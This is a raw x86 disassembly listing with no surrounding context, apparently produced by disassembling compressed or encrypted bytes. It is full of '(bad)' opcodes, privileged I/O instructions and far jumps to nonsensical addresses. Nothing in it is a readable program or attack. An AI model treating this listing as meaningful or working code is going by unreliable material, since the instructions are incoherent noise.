  409b9a:	mov    edx,DWORD PTR [eax+esi*1]
  409b9d:	pop    ebx
  409b9e:	ror    BYTE PTR [eax+0x7d61c6f6],0xeb
  409ba5:	stc    
  409ba6:	setne  BYTE PTR [ebx+0x2b44664]
  409bad:	iret   
  409bae:	xchg   edx,eax
  409baf:	cwde   
  409bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bb1:	in     al,dx
  409bb2:	jo     0x409c03
  409bb4:	add    al,0x47
  409bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb7:	mov    bl,0xf6
  409bb9:	push   ecx
  409bba:	retf   0x1f79
  409bbd:	in     al,0xb6
  409bbf:	dec    ecx
  409bc0:	adc    ebp,DWORD PTR ds:0xa81c5746
  409bc6:	and    ah,BYTE PTR [edi+0x7c19d75b]
  409bcc:	outs   dx,BYTE PTR ds:[esi]
  409bcd:	sub    BYTE PTR [esi-0x40],dh
  409bd0:	dec    edi
  409bd1:	jmp    0xef93535e
  409bd6:	test   eax,0x22e3a621
  409bdb:	test   esi,edi
  409bdd:	iret   
  409bde:	or     BYTE PTR ds:0xeeccfd95,bl
  409be4:	and    BYTE PTR [edi+0x12],0x6
  409be8:	mov    ds:0x6480efd,al
  409bed:	ss mov ebp,0xac629241
  409bf3:	fist   WORD PTR [eax+0x40]
  409bf6:	ds or  esi,edx
  409bf9:	xchg   edi,eax
  409bfa:	add    al,0x2f
  409bfc:	inc    ebp
  409bfd:	pop    edi
  409bfe:	xchg   esi,eax
  409bff:	fcomp  QWORD PTR [esp+esi*1+0x2bb229cd]
  409c06:	jns    0x409c49
  409c08:	push   0x29
  409c0a:	xor    BYTE PTR [edx+0x34452e3e],0xb4
  409c11:	xchg   esp,eax
  409c12:	pop    ecx
  409c13:	out    0x3,al
  409c15:	nop
  409c16:	fst    st(3)
  409c18:	loopne 0x409bc6
  409c1a:	(bad)  
  409c1c:	lock (bad) 
  409c1e:	movhps xmm3,QWORD PTR [ecx-0x6b]
  409c22:	mov    ebp,0x565f480e
  409c27:	scas   al,BYTE PTR es:[edi]
  409c28:	test   eax,0x7ba0e949
  409c2d:	cmp    eax,0xed929a91
  409c32:	lahf   
  409c33:	jecxz  0x409bff
  409c35:	data16 fwait
  409c37:	div    DWORD PTR [edx+0x271c3143]
  409c3d:	lods   eax,DWORD PTR ds:[esi]
  409c3e:	loope  0x409c94
  409c40:	xchg   ebx,eax
  409c41:	xlat   BYTE PTR ds:[ebx]
  409c42:	sbb    al,0x2a
  409c44:	inc    edx
  409c45:	fsubp  st(0),st
  409c47:	xchg   BYTE PTR [esi+0x1],bl
  409c4a:	inc    esi
  409c4b:	xor    BYTE PTR [edi],al
  409c4d:	out    dx,al
  409c4e:	lods   eax,DWORD PTR ds:[esi]
  409c4f:	out    dx,eax
  409c50:	add    BYTE PTR [edi+esi*8],ch
  409c53:	loopne 0x409be3
  409c55:	add    BYTE PTR [ebp-0x39ec6eaa],0x8f
  409c5c:	lea    ecx,ds:0x9a58bdbb
  409c62:	jnp    0x409c71
  409c64:	in     al,0x1
  409c66:	inc    edi
  409c67:	dec    esp
  409c68:	js     0x409c28
  409c6a:	mov    cl,0x4b
  409c6c:	push   cs
  409c6d:	push   ebx
  409c6e:	test   DWORD PTR [ebx+ecx*8-0xabea370],ebx
  409c75:	and    eax,0x185e07ba
  409c7a:	mov    esp,0x4c7a9396
  409c7f:	arpl   WORD PTR ds:0x245f1676,bx
  409c85:	sub    al,0xd5
  409c87:	ret    0x8a3
  409c8a:	xlat   BYTE PTR ds:[ebx]
  409c8b:	aas    
  409c8c:	xchg   BYTE PTR [esi+0x18],cl
  409c8f:	lds    esi,FWORD PTR [ebx+0x4]
  409c92:	call   0xf37b3e40
  409c97:	jae    0x409d13
  409c99:	inc    ebp
  409c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c9b:	and    al,BYTE PTR [eax+0x7ef8b22c]
  409ca1:	add    al,0xfc
  409ca3:	sbb    ah,dl
  409ca5:	add    BYTE PTR [esi+0x64],dh
  409ca8:	(bad)  
  409ca9:	cli    
  409caa:	ins    DWORD PTR es:[edi],dx
  409cab:	cmp    ebp,DWORD PTR [esi+eax*8]
  409cae:	pushf  
  409caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cb0:	out    dx,eax
  409cb1:	jbe    0x409cc6
  409cb3:	pop    ds
  409cb4:	adc    ecx,eax
  409cb6:	mov    WORD PTR [eax+0x6d46c4d1],fs
  409cbc:	or     eax,0x2cdd6a10
  409cc1:	shr    BYTE PTR [ecx-0x9],0xb0
  409cc5:	shl    DWORD PTR [edi-0x2e60a2b2],cl
  409ccb:	sbb    DWORD PTR [eax+0x7a09ae57],esp
  409cd1:	sahf   
  409cd2:	in     al,dx
  409cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cd4:	or     ah,BYTE PTR [ebx]
  409cd6:	retf   
  409cd7:	bswap  eax
  409cd9:	sbb    esi,ebp
  409cdb:	mov    BYTE PTR [ebp+0x4a],al
  409cde:	loopne 0x409cc5
  409ce0:	ror    DWORD PTR [ecx-0x7c],0xa8
  409ce4:	and    bl,BYTE PTR [edx+0x76]
  409ce7:	in     eax,dx
  409ce8:	or     BYTE PTR [ecx+0x42c7b78f],bl
  409cee:	push   eax
  409cef:	sti    
  409cf0:	std    
  409cf1:	or     ecx,DWORD PTR [eax+0x11]
  409cf4:	fmul   st,st(6)
  409cf6:	xor    DWORD PTR [edx],esp
  409cf8:	pop    edx
  409cf9:	and    eax,0xcfc465be
  409cfe:	mov    edi,0x52825778
  409d03:	es pop ss
  409d05:	rcl    edi,1
  409d07:	mov    al,ds:0x839ba31e
  409d0c:	xchg   edx,eax
  409d0d:	arpl   WORD PTR [ebp+0x63],bx
  409d10:	sub    BYTE PTR [ecx],ch
  409d12:	loope  0x409ce4
  409d14:	mov    ch,BYTE PTR [esi+eiz*2-0x59060e18]
  409d1b:	pop    eax
  409d1c:	rol    BYTE PTR [ebx+edx*8],0xc2
  409d20:	pop    edx
  409d21:	xchg   ebx,eax
  409d22:	xor    edi,DWORD PTR [ecx+0x5fc4e4bd]
  409d28:	push   ecx
  409d29:	lock mov esi,0x244498ad
  409d2f:	push   esp
  409d30:	out    0x5,eax
  409d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d33:	or     eax,0xdf83e684
  409d38:	inc    esi
  409d39:	(bad)  
  409d3a:	daa    
  409d3b:	adc    dh,BYTE PTR [edx+0x73]
  409d3e:	cli    
  409d3f:	jno    0x409d8a
  409d41:	inc    esp
  409d42:	mov    ds:0x3c28d3b4,al
  409d47:	or     bh,BYTE PTR ds:0x8f9bff1
  409d4d:	pop    esi
  409d4e:	(bad)  
  409d4f:	ret    0xaf1d
  409d52:	(bad)  
  409d53:	mov    al,ds:0x4bdee576
  409d58:	xchg   edi,eax
  409d59:	into   
  409d5a:	icebp  
  409d5b:	gs inc eax
  409d5d:	stc    
  409d5e:	and    DWORD PTR [eax-0x70d9573a],ebp
  409d64:	int    0xbd
  409d66:	mov    ds:0xebd2d546,al
  409d6b:	dec    eax
  409d6c:	not    DWORD PTR [ebp-0x7]
  409d6f:	mov    al,0x1f
  409d71:	push   cs
  409d72:	jle    0x409d2d
  409d74:	nop
  409d75:	xlat   BYTE PTR ds:[ebx]
  409d76:	xchg   esp,eax
  409d77:	mov    ch,0xc
  409d79:	imul   ecx,DWORD PTR [edi+eax*8-0x7f],0x77
  409d7e:	or     edx,ebp
  409d80:	dec    esp
  409d81:	mov    bl,0xd0
  409d83:	adc    DWORD PTR [edx-0x65dc5959],edi
  409d89:	mov    edx,0xb581ec50
  409d8e:	sub    ebx,esp
  409d90:	mov    dl,0x5c
  409d92:	les    esi,FWORD PTR [ebp-0x7d]
  409d95:	(bad)  
  409d96:	push   0xffffffee
  409d98:	push   esp
  409d99:	dec    ecx
  409d9a:	sbb    eax,0x530c5a4a
  409d9f:	fistp  WORD PTR [eax+0x6b]
  409da2:	inc    edi
  409da3:	lds    ebx,FWORD PTR [ebp-0xd]
  409da6:	inc    esp
  409da7:	mov    dh,0xd6
  409da9:	lods   eax,DWORD PTR ds:[esi]
  409daa:	lods   eax,DWORD PTR ds:[esi]
  409dab:	adc    eax,0xb236a037
  409db0:	cmp    al,0x37
  409db2:	push   eax
  409db3:	push   esp
  409db4:	xchg   edx,eax
  409db5:	jnp    0x409d82
  409db7:	outs   dx,DWORD PTR ds:[esi]
  409db8:	or     BYTE PTR [eax+0x5118f6c0],cl
  409dbe:	pop    ebp
  409dbf:	jnp    0x409e35
  409dc1:	cmc    
  409dc2:	cmp    eax,0x6769805e
  409dc7:	adc    BYTE PTR es:[ecx-0x34],bh
  409dcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dcc:	pop    eax
  409dcd:	outs   dx,BYTE PTR ds:[esi]
  409dce:	jno    0x409d87
  409dd0:	jg     0x409dac
  409dd2:	aaa    
  409dd3:	scas   al,BYTE PTR es:[edi]
  409dd4:	call   0x59ac39ef
  409dd9:	adc    cl,dh
  409ddb:	and    ecx,DWORD PTR [ebp+0x61fcd0cf]
  409de1:	mov    dh,0xd3
  409de3:	add    ebp,DWORD PTR [edi+ecx*4+0x75]
  409de7:	cmc    
  409de8:	xchg   esp,eax
  409de9:	xchg   DWORD PTR [edx],edi
  409deb:	cmp    edx,DWORD PTR ds:0xc9e456c9
  409df1:	mov    BYTE PTR [edx+0x0],ch
  409df4:	test   BYTE PTR [esi],dl
  409df6:	dec    ecx
  409df7:	adc    DWORD PTR [ebp+0x2f],ebp
  409dfa:	stos   BYTE PTR es:[edi],al
  409dfb:	pop    fs
  409dfd:	pop    esi
  409dfe:	inc    edi
  409dff:	dec    edi
  409e00:	inc    ebp
  409e01:	add    DWORD PTR ds:0xc76594ec,edi
  409e07:	loopne 0x409e0e
  409e09:	lds    eax,FWORD PTR [edx+0x6f]
  409e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e0d:	push   0x6e4cd131
  409e12:	mov    esp,0x48e58cc6
  409e17:	loop   0x409e24
  409e19:	js     0x409e04
  409e1b:	pop    es
  409e1c:	cwde   
  409e1d:	jecxz  0x409e31
  409e1f:	add    dh,al
  409e21:	mov    dl,0x8c
  409e23:	aaa    
  409e24:	push   0xffffff88
  409e26:	popf   
  409e27:	mov    BYTE PTR [edx],al
  409e29:	xchg   esi,eax
  409e2a:	sub    eax,0xe89039da
  409e2f:	and    esi,DWORD PTR [edx]
  409e31:	inc    esp
  409e32:	jecxz  0x409e26
  409e34:	fcom   DWORD PTR [ebx*2+0x2467f50]
  409e3b:	pop    edi
  409e3c:	adc    BYTE PTR [edx-0x1b],cl
  409e3f:	mov    cl,0xe4
  409e41:	div    DWORD PTR [edi]
  409e43:	jmp    0xb4da:0x33c911ec
  409e4a:	or     BYTE PTR [ebx-0x38],ah
  409e4d:	lods   eax,DWORD PTR ds:[esi]
  409e4e:	mov    esp,0xf598832b
  409e53:	add    al,0xc
  409e55:	retf   0xe6f1
  409e58:	inc    eax
  409e59:	ja     0x409ecb
  409e5b:	inc    ecx
  409e5c:	mov    ah,0xc8
  409e5e:	lods   al,BYTE PTR ds:[esi]
  409e5f:	add    al,0xb3
  409e61:	xchg   esp,eax
  409e62:	add    DWORD PTR ds:0x3d11c749,edx
  409e68:	dec    ecx
  409e69:	sub    eax,0x2a197e4e
  409e6e:	ins    DWORD PTR es:[edi],dx
  409e6f:	call   FWORD PTR [esi-0x38]
  409e72:	pop    eax
  409e73:	or     esi,ebp
  409e75:	cli    
  409e76:	pop    eax
  409e77:	fwait
  409e78:	push   eax
  409e79:	test   DWORD PTR [ebp+0x4d],edi
  409e7c:	jecxz  0x409ec6
  409e7e:	pop    edi
  409e7f:	pop    esp
  409e80:	test   BYTE PTR [edi+eiz*4-0x47],bl
  409e84:	xchg   esi,eax
  409e85:	pusha  
  409e86:	into   
  409e87:	shl    bl,0xbd
  409e8a:	adc    edx,DWORD PTR [edi]
  409e8c:	jp     0x409eaa
  409e8e:	cdq    
  409e8f:	jne    0x409ed4
  409e91:	adc    ecx,ebp
  409e93:	jle    0x409eec
  409e95:	imul   BYTE PTR ds:0x561c1ef8
  409e9b:	inc    ebp
  409e9c:	fdiv   DWORD PTR [ebx]
  409e9e:	or     BYTE PTR [edx+0x3f],ch
  409ea1:	xor    al,0x59
  409ea3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ea4:	in     eax,0xb7
  409ea6:	nop
  409ea7:	jl     0x409e52
  409ea9:	nop    DWORD PTR [ebx]
  409eac:	lahf   
  409ead:	pop    ss
  409eae:	dec    eax
  409eaf:	push   esi
  409eb0:	fs mov esi,0xe10387ba
  409eb6:	es cmp eax,0xe02042c3
  409ebc:	dec    ebp
  409ebd:	push   ebp
  409ebe:	push   esi
  409ebf:	stos   BYTE PTR es:[edi],al
  409ec0:	invd   
  409ec2:	shr    BYTE PTR [ebp-0x20ecfb34],cl
  409ec8:	sbb    BYTE PTR [edi],bl
  409eca:	scas   al,BYTE PTR es:[edi]
  409ecb:	arpl   WORD PTR [ecx+0x1b],si
  409ece:	cmp    BYTE PTR [eax],0x5d
  409ed1:	or     al,0x7b
  409ed3:	lods   eax,DWORD PTR ds:[esi]
  409ed4:	or     al,0xb8
  409ed6:	sbb    BYTE PTR [ebx],al
  409ed8:	(bad)  
  409ed9:	aad    0x3a
  409edb:	jmp    0x101e:0x82c881d0
  409ee2:	or     DWORD PTR [ecx+0x3],edi
  409ee5:	cmp    eax,0x86b3050b
  409eea:	pop    edx
  409eeb:	(bad)  [edi+edx*8+0x74]
  409eef:	adc    eax,0x9a290bfe
  409ef4:	mov    eax,ds:0x55930ef6
  409ef9:	nop
  409efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409efb:	sbb    al,BYTE PTR [edx+0x74]
  409efe:	mov    esi,0xb02d19d7
  409f03:	dec    ebp
  409f04:	enter  0x5ff9,0x85
  409f08:	xor    eax,0xd849b6bf
  409f0d:	test   BYTE PTR [ecx-0x31],ah
  409f10:	pop    esp
  409f11:	and    bh,BYTE PTR [ecx+0x5c]
  409f14:	or     eax,0xd6c48ad
  409f19:	cwde   
  409f1a:	and    esp,eax
  409f1c:	and    eax,esp
  409f1e:	sahf   
  409f1f:	out    dx,al
  409f20:	stos   BYTE PTR es:[edi],al
  409f21:	adc    ebx,DWORD PTR [edx+edx*2+0x204458da]
  409f28:	push   esi
  409f29:	xchg   ebp,eax
  409f2a:	outs   dx,BYTE PTR ds:[esi]
  409f2b:	and    ch,0x7e
  409f2e:	xchg   edx,eax
  409f2f:	jg     0x409f9b
  409f31:	adc    al,0x89
  409f33:	pop    ecx
  409f34:	mov    al,cl
  409f36:	call   0xf743:0x8aa1ae9e
  409f3d:	cs sbb eax,0xb74a28b9
  409f43:	ss loopne 0x409f67
  409f46:	dec    ebx
  409f47:	lods   eax,DWORD PTR ds:[esi]
  409f48:	xor    BYTE PTR [edi-0x56fcb0c0],cl
  409f4e:	mov    eax,ds:0x8e3c66e5
  409f53:	jge    0x409fb8
  409f55:	xchg   edx,eax
  409f56:	mov    cl,0x8
  409f58:	stc    
  409f59:	jge    0x409f56
  409f5b:	inc    ebp
  409f5c:	jb     0x409fdb
  409f5e:	push   cs
  409f5f:	out    dx,eax
  409f60:	and    DWORD PTR [esi*4-0x2bc3101a],edi
  409f67:	jg     0x409f3c
  409f69:	jae    0x409f7a
  409f6b:	dec    edx
  409f6c:	imul   ecx,DWORD PTR [eax],0x4c43245e
  409f72:	fwait
  409f73:	jmp    0xd29a:0xf90802e5
  409f7a:	(bad)  
  409f7b:	inc    eax
  409f7c:	addr16 rcr esp,cl
  409f7f:	jbe    0x409f67
  409f81:	push   ebx
  409f82:	mov    ebx,0xc5100556
  409f87:	shr    BYTE PTR [ebp+0x28],cl
  409f8a:	cli    
  409f8b:	mov    eax,0xaa0e23be
  409f90:	dec    esp
  409f91:	cmp    DWORD PTR ds:[edx+ebp*8],edx
  409f95:	mov    esp,0x5a3adf4a
  409f9a:	xor    bl,dl
  409f9c:	int3   
  409f9d:	add    ah,ch
  409f9f:	pop    esp
  409fa0:	imul   eax,DWORD PTR gs:[esi+edx*1],0x23
  409fa5:	mov    ah,0x63
  409fa7:	fsubr  QWORD PTR [edx+ecx*4+0xf]
  409fab:	lock into 
  409fad:	cwde   
  409fae:	dec    ebp
  409faf:	ja     0x409f87
  409fb1:	adc    DWORD PTR [ebx+edx*4-0x40ccb83e],0xfffffff5
  409fb9:	ret    
  409fba:	lock mov al,ds:0x46f03b62
  409fc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc1:	js     0x409fea
  409fc3:	je     0x409fc6
  409fc5:	int    0xf9
  409fc7:	dec    ebp
  409fc8:	out    0xaf,al
  409fca:	xor    dh,cl
  409fcc:	mov    edi,0x48fa16f0
  409fd1:	inc    ebp
  409fd2:	test   al,0xc2
  409fd4:	lahf   
  409fd5:	sar    BYTE PTR [ebx],cl
  409fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd8:	cmp    eax,0x547da89a
  409fdd:	dec    edx
  409fde:	out    0xa9,eax
  409fe0:	stos   DWORD PTR es:[edi],eax
  409fe1:	clc    
  409fe2:	popf   
  409fe3:	adc    al,0x4
  409fe5:	out    dx,al
  409fe6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe7:	inc    edi
  409fe8:	dec    ebx
  409fe9:	in     al,0x4e
  409feb:	dec    ecx
  409fec:	sti    
  409fed:	lahf   
  409fee:	xor    al,0x7e
  409ff0:	dec    esi
  409ff1:	cdq    
  409ff2:	cmp    BYTE PTR [eax+ebp*2-0x5d],ch
  409ff6:	push   ds
  409ff7:	dec    edi
  409ff8:	push   esi
  409ff9:	pop    ds
  409ffa:	leave  
  409ffb:	jge    0x40a01e
  409ffd:	pop    ebp
  409ffe:	jl     0x40a03a
  40a000:	jmp    0x716698ea
  40a005:	inc    edi
  40a006:	in     eax,dx
  40a007:	xor    DWORD PTR [eax+edi*4-0x1624d031],esi
  40a00e:	ret    0x13c4
  40a011:	shl    BYTE PTR [esi-0x5c76d9f8],cl
  40a017:	mov    ds:0xcac953cd,al
  40a01c:	clc    
  40a01d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a01e:	out    dx,eax
  40a01f:	in     al,dx
  40a020:	sbb    BYTE PTR [eax+eax*1],dh
  40a023:	cmp    al,0xe5
  40a025:	cwde   
  40a026:	(bad)  
  40a027:	stc    
  40a028:	cmp    al,0x55
  40a02a:	mov    cl,0x14
  40a02c:	or     bh,0x7e
  40a02f:	push   edx
  40a030:	adc    eax,0xada7828e
  40a035:	je     0x40a006
  40a037:	retf   
  40a038:	xor    eax,0x1ab6a0c6
  40a03d:	fisttp WORD PTR [eax-0x4d7e5865]
  40a043:	sub    eax,0x320897e7
  40a048:	repnz xchg ch,dl
  40a04b:	lods   eax,DWORD PTR ds:[esi]
  40a04c:	cmp    DWORD PTR [edx+0x6e],edi
  40a04f:	rcl    BYTE PTR [ecx],cl
  40a051:	les    edi,FWORD PTR [ebx]
  40a053:	aad    0x1a
  40a055:	add    cl,BYTE PTR [ecx-0x6a]
  40a058:	cmp    BYTE PTR gs:[esi-0x3a],ah
  40a05c:	sub    al,0xfb
  40a05e:	adc    eax,esi
  40a060:	bnd jg 0x40a08d
  40a063:	cdq    
  40a064:	lds    edi,FWORD PTR ss:[eax+0x6a]
  40a068:	lods   al,BYTE PTR ds:[esi]
  40a069:	mov    ?,WORD PTR [ecx]
  40a06b:	and    edi,DWORD PTR [ebp+0x76]
  40a06e:	push   cs
  40a06f:	stc    
  40a070:	fldenv [ebx-0x31]
  40a073:	mov    esp,0xc3b7c81d
  40a078:	push   esi
  40a079:	imul   esi,DWORD PTR [ecx-0x1a787fe8],0x4982dff4
  40a083:	sahf   
  40a084:	stos   DWORD PTR es:[edi],eax
  40a085:	jecxz  0x40a08d
  40a087:	fmul   QWORD PTR [ebx]
  40a089:	sbb    eax,0x5e289e79
  40a08e:	jnp    0x40a0b2
  40a090:	or     eax,DWORD PTR [edx]
  40a092:	outs   dx,DWORD PTR ds:[esi]
  40a093:	xchg   ebp,eax
  40a094:	cmp    DWORD PTR [esi-0x530fac5e],0x901af705
  40a09e:	mov    ah,0xc
  40a0a0:	pop    ds
  40a0a1:	add    eax,0x645126d2
  40a0a6:	mov    ?,WORD PTR [ebx]
  40a0a8:	cmp    al,0x59
  40a0aa:	xchg   BYTE PTR [ecx+0x283fbeb8],cl
  40a0b0:	inc    ecx
  40a0b1:	and    al,0x25
  40a0b3:	adc    eax,0x78cc1465
  40a0b8:	es ds sti 
  40a0bb:	mul    BYTE PTR [edi]
  40a0bd:	sub    DWORD PTR [ebx],edx
  40a0bf:	dec    esi
  40a0c0:	(bad)  
  40a0c1:	jb     0x40a0d2
  40a0c3:	out    dx,al
  40a0c4:	xlat   BYTE PTR ds:[ebx]
  40a0c6:	xor    bl,BYTE PTR [ecx+esi*4+0x7236b024]
  40a0cd:	dec    ecx
  40a0ce:	mov    ecx,0x51e60534
  40a0d3:	pop    edi
  40a0d4:	sbb    DWORD PTR [eax+0x35],eax
  40a0d7:	aas    
  40a0d8:	clc    
  40a0d9:	ror    DWORD PTR [ebp-0x104eece9],cl
  40a0df:	sahf   
  40a0e0:	or     al,0xcd
  40a0e2:	ja     0x40a0c1
  40a0e4:	mov    eax,ds:0x75e65c43
  40a0e9:	lods   eax,DWORD PTR ds:[si]
  40a0eb:	pop    edi
  40a0ec:	inc    ebp
  40a0ed:	sar    DWORD PTR [eax-0x782ed372],1
  40a0f3:	jae    0x40a0c2
  40a0f5:	inc    esi
  40a0f6:	(bad)  
  40a0f7:	sbb    BYTE PTR [edx-0x50844d7d],dl
  40a0fd:	and    al,0x6f
  40a0ff:	shl    BYTE PTR [eax-0x7fef624f],cl
  40a105:	and    ebx,edx
  40a107:	mov    BYTE PTR [edx],ah
  40a109:	sbb    dl,dh
  40a10b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a10c:	mov    ds:0x2d473fe1,eax
  40a111:	and    ch,BYTE PTR [eax-0xd]
  40a114:	sub    DWORD PTR [esi],0xa0fc00aa
  40a11a:	sti    
  40a11b:	jg     0x40a117
  40a11d:	pusha  
  40a11e:	mov    esi,0x9a8ffbd8
  40a123:	inc    edx
  40a124:	or     esp,ecx
  40a126:	jns    0x40a199
  40a128:	daa    
  40a129:	adc    DWORD PTR [ebx-0x61b64ff0],0xffffffd1
  40a130:	add    DWORD PTR [edx-0x6f9a040b],esi
  40a136:	out    dx,al
  40a137:	repnz cli 
  40a139:	je     0x40a140
  40a13b:	push   ebp
  40a13c:	dec    edx
  40a13d:	pusha  
  40a13e:	bound  esp,QWORD PTR [edx+0x696a4719]
  40a144:	push   0x2f
  40a146:	addr16 mov esp,0x36159f21
  40a14c:	push   0xffffffe3
  40a14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a14f:	pop    edx
  40a150:	(bad)  [edi-0x52]
  40a153:	add    ebx,DWORD PTR [esi+edx*2-0x12]
  40a157:	and    DWORD PTR [eax+0xb3b6357],0xffffffa6
  40a15e:	mov    al,0x91
  40a160:	scas   al,BYTE PTR es:[edi]
  40a161:	xchg   BYTE PTR [esp+ebx*2],al
  40a164:	repz imul esp,DWORD PTR [edi-0x7e],0x5d
  40a169:	xchg   ebp,eax
  40a16a:	in     al,0x9d
  40a16c:	dec    edx
  40a16d:	pop    es
  40a16e:	mov    bh,0xc0
  40a170:	call   0x4a01:0x8351375c
  40a177:	ret    0x103
  40a17a:	sub    ecx,DWORD PTR [eax+esi*1]
  40a17d:	mov    eax,0x920d4358
  40a182:	dec    esi
  40a183:	inc    esp
  40a184:	xor    al,0x46
  40a186:	stos   BYTE PTR es:[edi],al
  40a187:	popa   
  40a188:	xlat   BYTE PTR es:[ebx]
  40a18a:	inc    BYTE PTR [eax+edx*4-0x462b62b7]
  40a191:	(bad)  
  40a192:	jl     0x40a173
  40a194:	das    
  40a195:	push   cs
  40a196:	xor    bh,dl
  40a198:	add    dl,BYTE PTR [ebx-0x62c93604]
  40a19e:	ins    DWORD PTR es:[edi],dx
  40a19f:	push   ss
  40a1a0:	sbb    BYTE PTR [edi],bh
  40a1a2:	inc    ebx
  40a1a3:	pop    esi
  40a1a4:	mov    db4,ebx
  40a1a7:	dec    ecx
  40a1a8:	dec    eax
  40a1a9:	sub    BYTE PTR [ebx-0x62577ece],bl
  40a1af:	(bad)  [ebx+0x37]
  40a1b2:	js     0x40a177
  40a1b4:	clc    
  40a1b5:	ja     0x40a1fd
  40a1b7:	jle    0x40a19f
  40a1b9:	sbb    eax,0xda8b5cb2
  40a1be:	sar    BYTE PTR [edi],cl
  40a1c0:	nop
  40a1c1:	pop    es
  40a1c2:	daa    
  40a1c3:	or     BYTE PTR [ebx],bl
  40a1c5:	in     al,0xd0
  40a1c7:	or     eax,0x8d6d8a5a
  40a1cc:	(bad)  
  40a1cd:	pop    ebp
  40a1ce:	cmp    dh,cl
  40a1d0:	xchg   ebp,eax
  40a1d1:	mov    edx,DWORD PTR [ebx+eax*4+0x6]
  40a1d5:	inc    edx
  40a1d6:	jnp    0x40a197
  40a1d8:	mov    ah,0x46
  40a1da:	les    edi,FWORD PTR [eax+0x15]
  40a1dd:	adc    cl,BYTE PTR [esi]
  40a1df:	cli    
  40a1e0:	jmp    0x40a20d
  40a1e2:	pop    DWORD PTR [ecx+0x4d]
  40a1e5:	pop    ebx
  40a1e6:	push   ds
  40a1e7:	and    DWORD PTR ds:0xd09669a0,0x8bc076ad
  40a1f1:	push   ss
  40a1f2:	inc    ebp
  40a1f3:	out    0x8f,eax
  40a1f5:	div    BYTE PTR [ebp+ebp*1+0x5f]
  40a1f9:	loope  0x40a239
  40a1fb:	fist   WORD PTR [esi+0x46]
  40a1fe:	rol    DWORD PTR [edx],0xa0
  40a201:	or     ebp,DWORD PTR gs:[ebp+ecx*1+0x2d]
  40a206:	shr    BYTE PTR [eax],0xc3
  40a209:	lods   eax,DWORD PTR ds:[esi]
  40a20a:	adc    bh,BYTE PTR [ebp-0x58943212]
  40a210:	int    0x52
  40a212:	push   eax
  40a213:	fwait
  40a214:	inc    esi
  40a215:	mov    dh,0xc0
  40a217:	das    
  40a218:	add    BYTE PTR [edx+0x38],dl
  40a21b:	xchg   DWORD PTR [edx],eax
  40a21d:	xor    ebx,edx
  40a21f:	jge    0x40a1a4
  40a221:	cmovnp eax,DWORD PTR [ebx]
  40a224:	add    dl,BYTE PTR [ecx]
  40a226:	push   esp
  40a227:	dec    edi
  40a228:	pop    ecx
  40a229:	lods   eax,DWORD PTR ds:[esi]
  40a22a:	cmp    BYTE PTR [ebx],dl
  40a22c:	sub    bl,dl
  40a22e:	xchg   ecx,edx
  40a230:	pop    ebx
  40a231:	sbb    al,0x3a
  40a233:	sbb    DWORD PTR cs:[edi],edi
  40a236:	mov    al,ds:0xb1ef493c
  40a23b:	retf   
  40a23c:	xor    DWORD PTR [ecx-0x6c17da20],ebx
  40a242:	sub    esp,DWORD PTR [edx-0x47]
  40a245:	xchg   edx,eax
  40a246:	or     BYTE PTR ds:0x27fc792d,dl
  40a24c:	sbb    edx,DWORD PTR [ebx]
  40a24e:	or     al,0xc9
  40a250:	adc    ebp,edi
  40a252:	sub    eax,0x75b5aa45
  40a257:	pop    edi
  40a258:	add    eax,0x45f40009
  40a25d:	lea    ebp,[ebp-0x315cd106]
  40a263:	fcmovnbe st,st(7)
  40a265:	retf   0xd033
  40a268:	and    dh,bh
  40a26a:	jne    0x40a261
  40a26c:	push   edx
  40a26d:	jmp    0x40a28d
  40a26f:	inc    edx
  40a270:	ds pop ds
  40a272:	inc    esp
  40a273:	jae    0x40a29d
  40a275:	enter  0xc5e0,0x69
  40a279:	int3   
  40a27a:	aad    0x22
  40a27c:	add    DWORD PTR [eax+0x3554dde8],0x76446259
  40a286:	test   BYTE PTR [edx+edx*1+0x55],0x90
  40a28b:	pop    ebp
  40a28c:	sbb    eax,0x661be54a
  40a291:	cwde   
  40a292:	or     al,0x85
  40a294:	out    0x4b,eax
  40a296:	xor    al,0x93
  40a298:	jns    0x40a2f4
  40a29a:	ins    BYTE PTR es:[edi],dx
  40a29b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a29c:	inc    ecx
  40a29d:	jmp    FWORD PTR [ecx]
  40a29f:	lea    ebx,[ebp-0x4a]
  40a2a2:	adc    DWORD PTR [ecx+0xf],edx
  40a2a5:	cli    
  40a2a6:	dec    esi
  40a2a7:	and    al,0xc6
  40a2a9:	into   
  40a2aa:	scas   al,BYTE PTR es:[edi]
  40a2ab:	ss or  eax,0xd1ad8759
  40a2b1:	push   eax
  40a2b2:	sbb    DWORD PTR [ebx],0xffffffa8
  40a2b5:	push   ecx
  40a2b6:	jg     0x40a32c
  40a2b8:	pop    es
  40a2b9:	jge    0x40a2a3
  40a2bb:	in     al,dx
  40a2bc:	xor    eax,0x5c1e8dd6
  40a2c1:	pop    edi
  40a2c2:	frstor [edx]
  40a2c4:	dec    ebp
  40a2c5:	fs call 0x2da0:0x414e5478
  40a2cd:	inc    esp
  40a2ce:	es or  edx,esp
  40a2d1:	out    0x1e,al
  40a2d3:	jmp    0x16761fb3
  40a2d8:	das    
  40a2d9:	(bad)  
  40a2da:	mov    ecx,0x31472edd
  40a2df:	in     eax,dx
  40a2e0:	lahf   
  40a2e1:	inc    edx
  40a2e2:	call   0x19f3:0xd0686f44
  40a2e9:	mov    bl,0x19
  40a2eb:	cwde   
  40a2ec:	das    
  40a2ed:	out    dx,al
